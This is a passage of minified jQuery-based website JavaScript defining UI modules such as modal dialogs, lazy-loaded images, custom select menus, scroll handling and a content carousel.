            r = t()(o.target).hasClass("transcript-link") && "mobile" === (0, i._N)();
          t()(o.target, a).addBack(o.target).each(function () {
            t()(this).on("click", {
              isVideoModal: n,
              isMobileViewTranscript: r,
              isOpenInMobileOverlay: t()(o.target).hasClass("open-mobile-overlay")
            }, e.dialog.open);
          }), t()(document).on("click", ".dialog-close a, .dialog-mask", e.dialog.close);
        },
        open: function (a) {
          var o = "",
            i = a.data.isVideoModal ? "i-orb-x-svg" : "i-orb-x";
          void 0 !== a.preventDefault() && a.preventDefault(), o = a.data.isVideoModal ? t()('<div class="dialog-wrapper"><div class="dialog-mask vi-dialog-mask"></div><div class="dialog vi-dialog"><div class="dialog-content"></div><div class="dialog-close vi-close" ><a href="#" tabindex="0" class="modal-trap"><span class="orb" tabindex="0"><i class="' + i + '" ></i></span></a></div></div></div>') : t()('<div class="dialog-wrapper"><div class="dialog-mask"></div><div class="dialog"><div class="dialog-content"></div></div><div class="dialog-close"><a href="#"><span class="orb"><i class="' + i + '"></i></span></a></div></div>');
          var n = t()(this),
            s = n.closest("form"),
            l = "get",
            c = "",
            d = n.data("href"),
            u = o.find(".dialog-content"),
            _ = o.find(".dialog-mask");
          if (n.is(":button") && s.length && (d = s.attr("action"), c = s.serialize(), l = s.attr("method") || l, n.attr("name") && (c += "&" + n.attr("name") + "=" + n.val())), 1 != a.data.isMobileViewTranscript && void 0 !== d) {
            var f = (d = d.split("#"))[0],
              h = d[1],
              g = d[2];
            t()(".wrapper").add(_).on("touchstart touchmove", e.dialog.preventMove), t()("#hdnPracticeId").length && (f += "?practiceid=" + t()("#hdnPracticeId").val()), null == g && null == g || (f += "?requestedGuides=" + g, null == d[3] && null == d[3] || (f += "&telephone=" + d[3])), t().ajax({
              url: f,
              type: l,
              data: c,
              context: e.dialog,
              beforeSend: function () {
                try {
                  (0, r.M)(!0);
                } catch (e) {}
              },
              success: function (a) {
                try {
                  (0, r.M)(!1);
                } catch (e) {}
                t()("body").addClass("stop-scroll").append(o), t()(window).on("dd:resize", e.dialog.resize), setTimeout(function () {
                  t()(".dialog-wrapper").length > 1 && t()(".dialog-wrapper").slice(1).remove(), t()(".dialog").addClass("animate");
                }, 10), setTimeout(function () {
                  t()(window).trigger("dd:resize"), t()(".stop-scroll .dialog-close").css("display", "block");
                }, 500), u.append(t()(a).find("#" + h)), e.util.initModules(u), e.util.initHelpers(u);
                try {
                  (0, r.M)(!1);
                } catch (e) {}
              },
              complete: function () {
                var e = document.querySelector(this.settings.modalWrapper);
                this.settings.firstFocusableElement = e.querySelectorAll(this.settings.focusableElements)[0], this.settings.focusableContent = e.querySelectorAll(this.settings.focusableElements), this.settings.lastFocusableElement = this.settings.focusableContent[this.settings.focusableContent.length - 1], this.settings.lastToOneFocusableElement = this.settings.focusableContent[this.settings.focusableContent.length - 2], t()(this.settings.firstFocusableElement).focus();
              }
            });
          }
        },
        openForMessage: function (a) {
          var o = t()(".vi-close").length ? "i-orb-x-svg" : "i-orb-x",
            i = t()('<div class="dialog-wrapper"><div class="dialog-mask"></div><div class="dialog"><div class="dialog-content"></div></div><div class="dialog-close"><a href="#"><span class="orb"><i class="' + o + '"></i></span></a></div></div>'),
            n = i.find(".dialog-content"),
            s = i.find(".dialog-mask");
          t()(".wrapper").add(s).on("touchstart touchmove", e.dialog.preventMove), t()("body").addClass("stop-scroll").append(i), t()(window).on("dd:resize", e.dialog.resize), t()(".dialog-wrapper").length > 1 && t()(".dialog-wrapper").slice(1).remove(), t()(".dialog").addClass("animate"), t()(window).trigger("dd:resize"), t()(".stop-scroll .dialog-close").css("display", "block"), n.append(a), e.util.initModules(n), e.util.initHelpers(n);
          try {
            (0, r.M)(!1);
          } catch (e) {}
        },
        close: function (a) {
          a.preventDefault();
          var o = t()(this),
            n = o.closest("form"),
            r = "";
          o.is(":button") && n.length && ("tablet" === (0, i._N)() || "mobile" === (0, i._N)()) ? "" !== (r = document.referrer) && (window.location.href = r) : function (a) {
            "click" !== a.type && 27 !== a.which || (t()(".dialog-wrapper").remove(), t()("body").removeClass("stop-scroll").css("height", ""), t()(window).off("dd:resize", e.dialog.resize), t()(".wrapper").off("touchstart touchmove", e.dialog.preventMove));
            var o = e.dialog.settings.buttonClickContext.document.body,
              i = e.dialog.settings.openedDialogIdSelector,
              n = t()(o).find('[data-href*="' + i + '"]');
            t()(n).focus(), e.dialog.settings.openedDialogIdSelector = "", e.dialog.settings.buttonClickContext = null, e.dialog.settings.EnterButtonClickedOnModal = !1, e.dialog.settings.focusableContent = null, e.dialog.settings.firstFocusableElement = null, e.dialog.settings.lastFocusableElement = null, clearInterval(e.dialog.settings.scrollTranscriptInt);
          }(a), t()(window).trigger("dd:resize"), s.Z.addRemoveFocusExToLatElement("remove");
        },
        preventMove: function (e) {
          e.preventDefault();
        },
        resize: function () {
          var e = t()(window).height();
          t()("body").height(e);
        },
        transcriptClickContextHandler: function (a) {
          a.preventDefault();
          var o = t()(a.target).data("href").split("#");
          e.dialog.settings.openedDialogIdSelector = "#" + o[1], e.dialog.settings.EnterButtonClickedOnModal = !1, e.dialog.settings.buttonClickContext = this;
        }
      };
    }(a.Z)), function (e) {
      e["eq-height-cols"] = {
        settings: {
          target: ".mod-eq-height-cols",
          cols: [],
          useMinHeight: !0,
          requireEmptyNbs: !0
        },
        init: function (a) {
          var o = this.settings;
          t()(o.target, a).addBack(o.target).each(function () {
            var a = t()(this),
              o = a.attr("data-target-element") ? "." + a.data("target-element") : ".col";
            e["eq-height-cols"].settings.useMinHeight = !a.data("min-height") || a.data("min-height"), e["eq-height-cols"].settings.requireEmptyNbs = !a.data("require-empty-nbs") || a.data("require-empty-nbs"), e["eq-height-cols"].settings.cols.push(a.find(o)), t()(window).onload, t()(e["eq-height-cols"].resize(e["eq-height-cols"].settings.cols[e["eq-height-cols"].settings.cols.length - 1], e["eq-height-cols"].useMinHeight, e["eq-height-cols"].settings.requireEmptyNbs)), setTimeout(function () {
              for (var a = 0; a < e["eq-height-cols"].settings.cols.length; a++) t()(e["eq-height-cols"].resize(e["eq-height-cols"].settings.cols[a], e["eq-height-cols"].settings.useMinHeight, e["eq-height-cols"].settings.requireEmptyNbs));
            }, 900), t()(window).on("dd:resize", function () {
              for (var a = 0; a < e["eq-height-cols"].settings.cols.length; a++) t()(e["eq-height-cols"].resize(e["eq-height-cols"].settings.cols[a], e["eq-height-cols"].settings.useMinHeight, e["eq-height-cols"].settings.requireEmptyNbs));
            });
          });
        },
        resize: function (e, a, o) {
          var n = 0;
          setTimeout(function () {
            e.length && ("desktop" == (0, i._N)() || "small-desktop" == (0, i._N)() || "tablet" == (0, i._N)() ? (e.each(function () {
              l(t()(this).parents(".mod-eq-height-cols").find(".link-box-body-section")), t()(this).css("height", "");
              var e = t()(this).height();
              0 == e && o && 0 == t()(this).html().length && t()(this).html("&nbsp"), e > n && (n = e);
            }).css({
              height: n
            }), e.each(function () {
              t()(this).find(".quote-mark").css({
                "min-height": n
              }), t()(this).find(".valign-middle").css({
                height: n
              }), l(t()(this).parents(".mod-eq-height-cols").find(".link-box-body-section"));
            })) : (e.each(function () {
              t()(this).height(), n = 0;
            }).css({
              heightStyle: n,
              height: "auto"
            }).find(".link-box-body-section").css("height", "auto"), e.each(function () {
              t()(this).find(".valign-middle").css({
                height: 0
              });
            })));
          }, 900);
        }
      };
    }(a.Z), t()(void t()("#tabbedContainer .tabbedItem").on("click", function () {
      setTimeout(function () {
        t()(".mod-eq-height-cols").each(function () {
          l(t()(this).find(".link-box-body-section"));
        });
      }, 100);
    })), t()(function (e) {
      e.lazyload = {
        settings: {
          target: "img[data-src]"
        },
        init: function () {
          e.lazyload.resize(), t()(window).on("resize", function () {
            e.lazyload.resize();
          });
        },
        resize: function () {
          var a = [].slice.call(document.querySelectorAll(e.lazyload.settings.target));
          if ("IntersectionObserver" in window) {
            var o = new IntersectionObserver(function (a, i) {
              a.map(function (a) {
                if (a.isIntersecting) {
                  var i = a.target;
                  null == i.dataset.src && "undefined" == i.dataset.src || (i.src = i.dataset.src), (i.src.indexOf(".gif") > -1 || i.src.indexOf(".png") > -1 || i.src.indexOf(".svg") > -1 || "" === e.lazyload.getExtension(i.src.trim())) && i.classList.add("no-shimmer"), o.unobserve(i), e["eq-height-cols"].resize(t()(i).parents(".link-box-body-section").first(), !0, !0), (0, c.$)();
                }
              });
            }, {
              rootMargin: "0px 0px 100px 0px"
            });
            a.map(function (e) {
              "" != e.dataset.width && "" != e.dataset.height && e.dataset.width && e.dataset.height && (e.style.minHeight = e.dataset.height / e.dataset.width * e.offsetWidth + "px"), o.observe(e);
            });
          } else a.map(function (t) {
            var a = t.getAttribute("data-src");
            (a.indexOf(".gif") > -1 || a.indexOf(".png") > -1 || a.indexOf(".svg") > -1 || "" === e.lazyload.getExtension(a.trim())) && t.classList.add("no-shimmer"), t.hasAttribute("data-src") && (t.src = t.getAttribute("data-src"));
          });
        },
        getExtension: function (e) {
          if ("" === e.trim()) return -1;
          var t = e.split(/[\\/]/).pop(),
            a = t.lastIndexOf(".");
          return "" === t || a < 1 ? "" : t.slice(a + 1).trim();
        }
      };
    }(a.Z)), function (e) {
      e.location = {
        coords: "",
        getPosition: function (t) {
          function a() {
            e.location.updateCoords(""), "function" == typeof t && t(!1);
          }
          "geolocation" in navigator ? navigator.geolocation.getCurrentPosition(function (a) {
            e.location.updateCoords(a.coords), "function" == typeof t && t(!0);
          }, a) : a();
        },
        updateCoords: function (a) {
          e.location.coords = a, t()(window).trigger("dd:locationUpdate", a);
        }
      };
    }(a.Z), window.updateGeolocationInCookie = function (e) {
      "undefined" != e && "True" === e ? window.dd.location.getPosition(function (e) {}) : "undefined" != window.dd && window.dd.location.coords;
    }, function (e) {
      e["meta-viewport"] = {
        init: function () {
          this.tag = t()('meta[name="viewport"]'), this.initialValue = this.tag.attr("content"), navigator.userAgent.match(/iPhone|iPad/i) && (t()(window).on("rotate", function () {
            e["meta-viewport"].preventZoom(100);
          }), t()(":input").on("focus", function () {
            e["meta-viewport"].preventZoom();
          }).on("blur", function () {
            e["meta-viewport"].restore();
          }));
        },
        preventZoom: function (t) {
          void 0 === t && (t = 0), e["meta-viewport"]._preventZoom(), t > 0 && setTimeout(function () {
            e["meta-viewport"].restore();
          }, t);
        },
        _preventZoom: function () {
          e["meta-viewport"].tag.attr("content", e["meta-viewport"].initialValue + ", maximum-scale=1.0, user-scalable=no");
        },
        restore: function () {
          e["meta-viewport"].tag.attr("content", e["meta-viewport"].initialValue);
        }
      };
    }(a.Z), t()(window).on("load", function (e) {
      e["scroll-to"] = {
        settings: {
          target: ".mod-scroll-to",
          currentElement: "",
          yPosition: ""
        },
        init: function (t) {
          $('.mod-scroll-to a[href^="#"]', t).on("click touchstart", function (a) {
            var o,
              i,
              n,
              r = $(this),
              s = r.attr("href");
            if ("touchstart" == a.type) o = r, i = a.touches[0].pageY, o.on("touchend", function (t, a, o, r) {
              if (void 0 === o && (o = $(this).attr("href")), (n = t.originalEvent.changedTouches[0].pageY) <= i + 5 && n >= i - 5) {
                if (o.split("#")[1]) {
                  var s = $(o, r);
                  if (s.length) {
                    var l = void 0 !== l ? l : t.target,
                      c = +(l.attr("data-offset") || 0),
                      d = s.offset().top + c;
                    e["scroll-to"].scrollTo(d), t.preventDefault();
                  }
                } else "#" === o && e["scroll-to"].scrollTo(0);
                t.preventDefault;
              }
            });else if ("click" == a.type) {
              if (s.split("#")[1]) {
                var l = $(s, t);
                if (l.length) {
                  r.attr("data-offset");
                  var c = l.offset().top,
                    d = 0;
                  $(".persistentNav-parent").length && (d = $(".persistentNav-parent .pin-body").is(":visible") && "fixed" == $(".persistentNav-parent .pin-body").css("position").toLowerCase() ? $(".persistentNav-parent .pin-body").height() : $(".persistentNav-parent .pin-body").is(":visible") && $(".persistentNav-parent .pin-body").is(":visible") && "fixed" != $(".persistentNav-parent .pin-body").css("position").toLowerCase() ? 2 * $(".persistentNav-parent .pin-body").height() : $(".persistentNav-parent .pin-body").height()), c -= d, e["scroll-to"].scrollTo(c), a.preventDefault();
                }
              } else "#" === s && e["scroll-to"].scrollTo(0);
              a.preventDefault;
            }
          });
        },
        scrollTo: function (e, t) {
          void 0 === t && (t = 600);
          var a;
          (a = "number" == typeof e ? e : e.length ? e.offset().top : -1) >= 0 && $("html:not(:animated), body:not(:animated)").animate({
            scrollTop: a
          }, t);
        }
      };
    }(a.Z)), function () {
      var e = t()(window),
        a = [],
        o = [],
        i = !1,
        n = 0,
        r = {
          top: 0,
          right: 0,
          bottom: 0,
          left: 0
        };
      function s() {
        ++n;
        var i = e.scrollTop(),
          s = e.scrollLeft(),
          l = s + e.width(),
          c = i + e.height(),
          d = function (e, o, i, n) {
            var r = t()();
            return t().each(a, function (t, a) {
              var s = a.offset().top,
                l = a.offset().left,
                c = l + a.width(),
                d = s + a.height();
              !(l > o || c < n || s > i || d < e) && r.push(a);
            }), r;
          }(i + r.top, l + r.right, c + r.bottom, s + r.left);
        t().each(d, function (e, t) {
          if ("number" != typeof t.data("scrollSpy:ticks")) return t.triggerHandler("scrollSpy:enter"), !1;
          t.data("scrollSpy:ticks", n);
        }), t().each(o, function (e, t) {
          var a = t.data("scrollSpy:ticks");
          "number" == typeof a && a !== n && (t.triggerHandler("scrollSpy:exit"), t.data("scrollSpy:ticks", null));
        }), o = d;
      }
      function l() {
        e.trigger("scrollSpy:winSize");
      }
      var c = Date.now || function () {
        return new Date().getTime();
      };
      function d(e, t, a) {
        var o,
          i,
          n,
          r = null,
          s = 0;
        a || (a = {});
        var l = function () {
          s = !1 === a.leading ? 0 : c(), r = null, n = e.apply(o, i), o = i = null;
        };
        return function () {
          var d = c();
          s || !1 !== a.leading || (s = d);
          var u = t - (d - s);
          return o = this, i = arguments, u <= 0 ? (clearTimeout(r), r = null, s = d, n = e.apply(o, i), o = i = null) : r || !1 === a.trailing || (r = setTimeout(l, u)), n;
        };
      }
      t().scrollSpy = function (o, n) {
        (o = t()(o)).each(function (e, o) {
          a.push(t()(o));
        }), n = n || {
          throttle: 100
        }, r.top = n.offsetTop || 0, r.right = n.offsetRight || 0, r.bottom = n.offsetBottom || 0, r.left = n.offsetLeft || 0;
        var l = d(s, n.throttle || 100),
          c = function () {
            t()(document).ready(l);
          };
        return i || (e.on("scroll", c), e.on("resize", c), i = !0), setTimeout(c, 0), o;
      }, t().winSizeSpy = function (a) {
        return t().winSizeSpy = function () {
          return e;
        }, a = a || {
          throttle: 100
        }, e.on("resize", d(l, a.throttle || 100));
      }, t().fn.scrollSpy = function (e) {
        return t().scrollSpy(t()(this), e);
      };
    }(), t()(function (e) {
      e.select = {
        settings: {
          target: ".mod-select",
          placeholder: '<div class="select-placeholder"></div>',
          dropdown: '<div class="select-dropdown"></div>',
          focus: "focus",
          selected: "select-selected",
          active: "select-active"
        },
        init: function (a) {
          var o = this.settings;
          t()(o.target, a).addBack(o.target).each(function () {
            var a = t()(this),
              i = a.find("select"),
              n = t()(o.placeholder),
              r = a.attr("data-dropdown");
            n.html(e.select.placeholderValue(i)), t()(".mod-select").each(function () {
              t()(".select-placeholder", this).length || n.appendTo(a);
            }), "custom" == r ? (n.html('<a href="#">' + n.html() + "</a>").on("click", function (t) {
              a.hasClass(o.active) ? e.select.closeDropdown(a) : e.select.openDropdown(a), t.preventDefault();
            }).on("keydown", function (t) {
              38 != t.keyCode && 40 != t.keyCode && 32 != t.keyCode || (e.select.openDropdown(a), t.preventDefault());
            }).find("a"), e.select.buildDropdown(a, i, n), t()("body").on("click", function (i) {
              t()(i.target).closest(o.target).length || e.select.closeDropdown(a, !1);
            })) : a.on("mouseenter", ".select-placeholder", function () {
              e.select.resize(a, i);
            }), i.on("change", function (t) {
              var o = e.select.placeholderValue(i);
              "custom" == r && (o = '<a href="#">' + o + "</a>"), n.html(o), e.select.resize(a, i);
            }), i.on("focus blur", function (e) {
              a.toggleClass(o.focus, "focus" == e.type);
            }), a.on("focusin focusout", ".select-placeholder a", function (e) {
              a.toggleClass(o.focus, "focusin" == e.type);
            }), e.select.resize(a, i), t()(window).on("dd:resize", function () {
              e.select.resize(a, i);
            });
          });
        },
        rebuild: function (a) {
          (a = e.select.validTarget(a)).each(function () {
            var a = t()(this),
              o = a.find("select"),
              i = a.find(".select-placeholder");
            e.select.buildDropdown(a, o, i);
          });
        },
        buildDropdown: function (a, o, i) {
          var n = e.select.settings,
            r = t()(n.dropdown),
            s = e.select.getOptions(o);
          a.find(".select-dropdown").remove(), r.html(s), a.append(r), s = s.find("[data-value]"), r.on("click", function (i) {
            var n = t()(i.target).closest("[data-value]");
            if (n.length) {
              var r = 0;
              s.each(function (e) {
                t()(this).is(n) && (r = e);
              }), o.prop("selectedIndex", r).trigger("change"), e.select.closeDropdown(a);
            }
            i.preventDefault();
          });
          var l = r.find("[data-value]");
          r.on("keydown", function (a) {
            var o = t()(document.activeElement);
            if (38 == a.keyCode || 40 == a.keyCode) {
              var i = l.index(o),
                n = 1;
              38 == a.keyCode && (n = -1);
              var r = i + n;
              r < 0 && (r = 0), l.eq(r).focus(), a.preventDefault();
            }
            32 == a.keyCode && (a.preventDefault(), o.trigger("click")), 9 == a.keyCode && a.preventDefault(), 27 == a.keyCode && e.select.closeDropdown(o);
          });
        },
        openDropdown: function (t) {
          var a = e.select.settings;
          (t = e.select.validTarget(t)).addClass(a.active);
          var o = e.select.getSelectedIndex(t);
          t.find(".select-dropdown [data-value]").removeClass(a.selected).eq(o).addClass(a.selected).focus();
        },
        closeDropdown: function (t, a) {
          var o = e.select.settings;
          (t = e.select.validTarget(t)).removeClass(o.active), (void 0 === a || a) && t.find(".select-placeholder a").eq(0).focus();
        },
        getSelectedIndex: function (e) {
          var a = e.find("option"),
            o = a.filter(":selected"),
            i = 0;
          return a.each(function (e) {
            t()(this).is(o) && (i = e);
          }), i;
        },
        getOptions: function (a) {
          var o = t()("<ul></ul>");
          return a.children().each(function () {
            var a = t()(this),
              i = "";
            if (a.is("optgroup")) {
              var n = e.select.getOptions(a);
              n.addClass("optgroup"), (n = n.wrap("<li></li>").parent()).prepend('<div class="optgroup-label">' + e.select.optionValue(a) + "</div>"), i = n;
            } else (i = t()('<a href="#" data-value="' + a.val() + '"></a>')).html(e.select.optionValue(a)), i = i.wrap("<li></li>").parent();
            o.append(i);
          }), o;
        },
        validTarget: function (a) {
          var o = e.select.settings.target;
          return a && a.filter(o).length || (a = t()(o)), a;
        },
        optionValue: function (e) {
          return e.is("optgroup") ? e.data("placeholder") || e.attr("label") : e.data("placeholder") || e.text();
        },
        placeholderValue: function (t) {
          var a = t.find("option:selected");
          return e.select.optionValue(a);
        },
        resize: function (e, t) {
          t.height(e.height()).width(e.width());
        }
      };
    }(a.Z)), t()(function (e) {
      e.tel = {
        settings: {
          target: 'a[href^="tel:"], a[data-tel-href]'
        },
        init: function (t) {
          this.settings, e.tel.resize(t), $(window).on("dd:resize", function () {
            e.tel.resize(t);
          });
        },
        resize: function (t) {
          var a = e.tel.settings,
            o = "lrg" == e.util.layout(),
            i = !$(a.target, t).parents().hasClass("total-o");
          !$(a.target, t).parent().hasClass("call-center-opening") && i && $(a.target, t).addBack(a.target).each(function () {
            var e = $(this),
              t = e.attr("href") || e.attr("data-tel-href");
            e.attr("data-tel-href", t).toggleClass("tel-disabled", o), o ? e.removeAttr("href") : (e.attr("href", t), e.addClass("tel-no-link"));
          });
        }
      };
    }(a.Z)), t()(function (e) {
      e.toggle = {
        settings: {
          target: ".mod-toggle",
          links: ".tg-link",
          show: ".tg-show",
          hide: "tg-hide",
          scroll: "tg-scroll",
          close: ".tg-close"
        },
        init: function (a) {
          var o = e.toggle.settings;
          t()(o.target, a).addBack(o.target).each(function () {
            var a = t()(this),
              i = a.find(o.links),
              n = a.find(o.close);
            i.find(a.data("toggle-target")).addClass(o.hide), i.on("click", t().proxy(e.toggle.toggle, a)), n.on("click", t().proxy(e.toggle.close, a));
          });
        },
        toggle: function (a) {
          var o = e.toggle.settings,
            n = t()(a.currentTarget),
            r = n.find(this.data("toggle-target")),
            s = r.hasClass(o.show.substring(1));
          r.add(n).add(n.parent()).toggleClass(o.show.substring(1), !s), null !== n.parent().attr("data-class") && "" !== n.parent().attr("data-class") && void 0 !== n.parent().attr("data-class") && r.add(n).add(n.parent()).toggleClass(n.parent().attr("data-class"), !r.hasClass(n.parent().attr("data-class"))), t()(a.target).parents(".footer").length ? (0, i.tq)() && t()(a.target).parents(".footer").find("i").is(":visible") && t()(a.target).parents(".footer").find(".tg-link").is(":visible") && a.preventDefault() : a.preventDefault();
        },
        close: function (a) {
          var o = t()(a.target).parent().parent().prev();
          scrollTo && "sml" === e.util.layout() && o.hasClass("tg-show") && e["scroll-to"].scrollTo(o), a.preventDefault();
        }
      };
    }(a.Z)), function (e) {
      t().custom = {
        settings: {
          target: ".mod-custom",
          link: ".overlay-anchor",
          overlay: ".mod-search-overlay",
          body: "body",
          activeOverlay: "active-overlay",
          closeIcon: ".close-icon",
          inputField: "#gsa_search-scl",
          icons: ".close-icon-over-input",
          populorSearches: ".populor-searches",
          closeIconInput: ".close-icon-over-input",
          searchIcon: ".search-icon-grey",
          charLimit: 3
        },
        init: function (a) {
          var o = this.settings;
          t()(o.target, a).addBack(o.target).each(function () {
            window.jQuery && setTimeout(function () {
              e.typeaheadmod.init(), t()(".search-btn-scl").on("click", function () {
                if (!t()(o.inputField).val()) return !1;
              });
            }, 500);
          });
        },
        customEvent: function (e) {}
      };
    }(a.Z), window.showBusy = r.M, function (e) {
      e.carousel = {
        settings: {
          target: ".scrolling-tab-carousel, .mod-carousel"
        },
        init: function (a) {
          var o = this.settings;
          t()(o.target, a).addBack(o.target).each(function (a) {
            a = t()(this), e.carousel.prepTheStage(a), e.carousel.showtime(a), a.hasClass("featured-carousel");
          });
        },
        prepTheStage: function (a) {
          (a = a.find(".rail")).find(".prop").each(function (e) {
            t()(this).attr("data-inventory", e).toggleClass("alt", 0 != e % 2);
          });
          var o = a.clone().removeClass("rail").addClass("inventory");
          o.find(".prop").attr("tabindex", "-1"), o.insertBefore(a), e.carousel.addEvents(o), a.html("");
        },
        showtime: function (a) {
          function o() {
            d = e.carousel.calculateBounds(n, r), e.carousel.updateConstraints(n, s, l, c, d, !0);
            var t = e.carousel.getPropsWeight(r) <= d.stage.propCapacity;
            a.toggleClass("short-staffed", t), t || (d = e.carousel.calculateBounds(n, r), c = e.carousel.propsOnSet(s, c, r, d, u), i(0)), a.toggleClass("transitions-enabled", !t);
          }
          function i(t, o) {
            t || (t = 0), o || (o = r);
            var i = 0;
            i = u, u = e.carousel.propSpotlight(c, d, t, u), i.attr("data-inventory") !== u.attr("data-inventory") && e.carousel.closeModal(a), c = e.carousel.propsOnSet(s, c, o, d, u), e.carousel.updateConstraints(n, s, l, c, d), e.carousel.updatePositions(c, d, u), i = t / d.stage.propCapacity, e.carousel.updateSetList(a, d.sets, i);
          }
          var n = a.find(".stage"),
            r = n.find(".inventory").children(),
            s = n.find(".rail"),
            l = n.find(".curtain"),
            c = e.carousel.propsOnSet(s, !1, r, d, !1),
            d = e.carousel.calculateBounds(n, c),
            u = e.carousel.updatePositions(c, d, c.eq(0)),
            _ = a.find(".controls"),
            f = void 0 !== a.attr("data-interval"),
            h = +a.attr("data-interval") || 1e4,
            g = !1;
          t()(window).on("dd:resize", o), setTimeout(o, 100), _.on("click", "a", function (e) {
            var o = t()(e.currentTarget),
              n = d.stage.propCapacity,
              r = o.attr("data-offset");
            o.hasClass("set-prev") && (n *= -1), r && (n = d.stage.propCapacity * +r), t()(window).trigger("dd:stopCarousel", a), i(n), e.preventDefault();
          }), a.on("movestart", function (e) {
            t()(e.target);
            var o = d.stage.propCapacity;
            e.distY > e.distX && e.distY < -e.distX || e.distY < e.distX && e.distY > -e.distX ? (0 < e.distX && (o *= -1), t()(window).trigger("dd:stopCarousel", a), i(o)) : e.preventDefault();
          }), f && (500 > h && (h = 500), g = setInterval(function () {
            Math.random(), i(d.stage.propCapacity);
          }, h)), t()(window).on("dd:stopCarousel", function (e, o) {
            ((o = t()(o)).is(a) || o.find(a).length || o.closest(a).length) && clearInterval(g);
          });
        },
        updateConstraints: function (t, a, o, i, n, r) {
          t.add(a).outerHeight(n.stage.height), void 0 !== r && e.carousel.updatePropHeights(i, n), a.add(o).outerWidth(n.viewport.width), a.add(o).css("left", "-" + n.stage.offset.left + "px");
        },
        updatePropHeights: function (e, a) {
          return e.each(function () {
            var e,
              o = t()(this),
              i = o.find(".slab");
            e = 0 + parseInt(o.css("padding-top"), 10), e += parseInt(o.css("padding-bottom"), 10), i.outerHeight(a.prop.height - e);
          }), e;
        },
        updatePositions: function (a, o, i) {
          var n = o.stage.offset.left + 35,
            r = i.index(),
            s = 0,
            l = !e.util.supports.cssTransitions(),
            c = 0;
          return t()(window).width() < 360 && (n = o.stage.offset.left + 40), a.removeClass("on-stage").attr("tabindex", "-1"), a.each(function () {
            var a = t()(this),
              i = e.carousel.getPropWeight(a);
            r > c && (s += i), r <= c && r + o.stage.propCapacity > c + (i - 1) ? (a.addClass("on-stage").removeAttr("tabindex"), c += i) : c++;
          }), n -= s * o.prop.width, a.each(function () {
            var a = t()(this),
              i = e.carousel.getPropWeight(a);
            l ? a.animate({
              left: n
            }, 700) : a.css("left", n), n += o.prop.width * i;
          }), i;
        },
        propsOnSet: function (a, o, i, n, r) {
          if (o) {
            var s = r.index(),
              l = +(f = o.eq(0)).attr("data-inventory"),
              c = o.eq(-1),
              d = +c.attr("data-inventory");
            if (r.attr("data-inventory"), r = n.viewport.propsBeforeStage + n.viewport.propsReserve - s, s = n.viewport.propsAfterStage + n.viewport.propsReserve - (o.length - (s + (n.stage.propCapacity - 1))), 0 < r && isFinite(r)) {
              for (var u = !f.hasClass("alt"), _ = t()("<div>"), f = 0; f < r; f++) {
                var h = l - f - 1;
                (h = (h = e.carousel.getElemEq(i, h)).clone()).css("left", "-" + (n.viewport.width + 2 * n.prop.width) + "px").toggleClass("alt", u), u = !u, _.prepend(h);
              }
              l = t()(_.html()), a.prepend(l), e.carousel.addEvents(l), _.remove();
            } else if (0 > r && isFinite(r)) for (l = Math.abs(r), f = 0; f <= l; f++) h = o.eq(0), _ = e.carousel.getPropWeight(h), o = o.not(h), h.remove(), f += _ - 1;
            if (0 < s && isFinite(r)) {
              for (u = !c.hasClass("alt"), _ = t()("<div>"), f = 0; f < s; f++) h = d + f + 1, (h = (h = e.carousel.getElemEq(i, h)).clone()).css("left", n.viewport.width + 2 * n.prop.width + "px").toggleClass("alt", u), u = !u, _.append(h);
              l = t()(_.html()), a.append(l), e.carousel.addEvents(l), _.remove();
            } else if (0 > s) for (l = Math.abs(s), f = 0; f <= l; f++) h = o.eq(-1), _ = e.carousel.getPropWeight(h), o = o.not(h), h.remove(), f += _ - 1;
          } else o = i.clone(), a.html(o), e.carousel.addEvents(o);
          return o = a.find(".prop"), n && e.carousel.updatePropHeights(o, n), o;
        },
        propSpotlight: function (t, a, o, i) {
          a = i.index(), i = 0;
          var n = 0 > o;
          o = Math.abs(o);
          for (var r = 0; r < o; r++) {
            var s = r;
            n && (s *= -1), s = t.eq(a + s), s = e.carousel.getPropWeight(s), i += s = Math.abs(s - 2, 10);
          }
          return n && (i *= -1), 0 > (a += i) && (a = 0), a >= t.length && (a = t.length - 1), t.eq(a);
        },
        calculateBounds: function (a, o) {
          var i = {
              stage: {},
              prop: {},
              viewport: {},
              production: {}
            },
            n = o.filter(":not(.prop-primary)").eq(0);
          i.prop.width = 1, n.length ? i.prop.width = e.carousel.getElemWidth(n) : (n = o.filter(".prop-primary").eq(0)).length && (i.prop.width = e.carousel.getElemWidth(n) / 2), i.prop.height = e.carousel.getTallestElemHeight(o), i.viewport.width = t()(window).width(), 320 > i.viewport.width && (i.viewport.width = 320), i.stage.width = e.carousel.getElemWidth(a), i.stage.height = i.prop.height, i.stage.propCapacity = e.carousel.getPropCapacity(i.stage.width, i.prop.width), 1 > i.stage.propCapacity && (i.stage.propCapacity = 1), i.stage.offset = a.offset(), i.stage.offset.right = i.stage.offset.left + i.stage.width, i.stage.offset.bottom = i.stage.offset.top + i.stage.height, i.viewport.propsBeforeStage = e.carousel.getPropCapacity(i.stage.offset.left, i.prop.width, !0), i.viewport.propsAfterStage = e.carousel.getPropCapacity(i.viewport.width - i.stage.offset.right, i.prop.width, !0), n = 3 * i.stage.propCapacity;
          var r = Math.ceil(o.length / 2);
          return n < r && (n = r), i.viewport.propsReserve = n, i.sets = e.carousel.compileSets(o, i.stage.propCapacity), i;
        },
        updateSetList: function (e, a, o) {
          e = e.find(".set-list");
          var i = t()("<ul />"),
            n = +e.attr("data-set"),
            r = "";
          for (n || (n = 1), o && (n += o), n > (a = a.length) && (n = 1), 1 > n && (n = a), o = 1; o <= a; o++) r = '<li><a href="#" data-offset="' + (o - n) + '"', o == n && (r += ' class="active"'), r += 'data-set="' + o + '">' + o + "</a></li>", i.append(r);
          return e.attr("data-set", n).html(i.html());
        },
        compileSets: function (a, o) {
          var i = [],
            n = 0,
            r = 0;
          return a.each(function (a) {
            var s = t()(this),
              l = e.carousel.getPropWeight(s);
            ((r += l) > o || 0 == a) && (i[n] = [], n++, r = l), i[n - 1].push(s);
          }), i;
        },
        getElemWidth: function (e) {
          var t = 0;
          return void 0 !== (t = e[0]).getBoundingClientRect ? (e = t.getBoundingClientRect(), t = e.width ? Math.round(e.width) : Math.round(e.right - e.left)) : t = e.outerWidth(), t;
        },
        getElemHeight: function (e) {
          var t = 0;
          return void 0 !== (t = e[0]).getBoundingClientRect ? (e = t.getBoundingClientRect(), t = e.height ? Math.round(e.height) : Math.round(e.bottom - e.top)) : t = e.outerHeight(), t;
        },
        getPropWeight: function (t) {
